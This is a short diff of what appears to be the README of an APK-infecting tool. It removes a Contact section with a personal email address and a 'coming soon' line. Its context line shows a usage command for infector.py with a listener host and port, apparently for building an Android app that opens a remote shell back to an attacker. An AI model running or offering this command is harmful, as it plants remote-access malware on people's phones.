@@ -92,10 +92,5 @@ $ python3 infector.py --lhost 192.168.43.70 --lport 4444 --apk-name NEW_APK_NAME
 
 * All Contributors are welcome, this repo needs contributors who will improve this tool to make it best.
 
-## Contact
-
-singhpushpender250@gmail.com 
-
-## More Features Coming Soon...
 
 
